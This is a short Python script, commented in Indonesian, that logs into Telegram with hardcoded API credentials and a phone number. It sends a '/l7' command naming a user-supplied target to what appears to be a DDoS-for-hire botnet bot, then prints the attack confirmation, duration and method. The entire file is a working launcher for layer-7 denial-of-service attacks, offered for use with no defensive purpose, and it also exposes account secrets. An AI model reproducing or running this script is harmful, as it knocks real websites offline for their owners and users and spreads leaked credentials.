import sys
import asyncio
from telethon import TelegramClient, events

# Ganti dengan nilai yang Anda dapatkan dari my.telegram.org
api_id = '21472165'
api_hash = '9dc3b8a760d2b84edf9d805980b177e6'
phone_number = '6287777870536'
target = ' '.join(sys.argv[1:]) if len(sys.argv) > 1 else 'example.com'
# Buat klien Telegram
client = TelegramClient('session_name', api_id, api_hash)

async def main():
    await client.start(phone_number)
    # Ganti dengan username atau chat ID target
    user = '@BOTNETWORLD_BOT'
    message = f'/l7 {target}'
    await client.send_message(user, message)
    # print(f'*[GT-BOT]* Target : {message}')

    # Event handler untuk pesan baru
    @client.on(events.NewMessage(from_users=user))
    async def handler(event):
        message = event.message.message
        if "Attack" in message:
            print(f"Target : {target}\nTime : 60\nMethod : BOTNET-GT(LOW)")
        elif "Invalid" in message:
            print("Invalid Input (ex: python p.py (target))")
        elif "Please" in message:
            print(f"{message}")
        else:
            print(f"{message}")
        await client.disconnect()

    try:
        # Berikan waktu untuk menerima pesan sebelum keluar
        await asyncio.wait_for(client.run_until_disconnected(), timeout=20)
    except asyncio.TimeoutError:
        print("Ddos service is maintenance now!")
        await client.disconnect()

with client:
    client.loop.run_until_complete(main())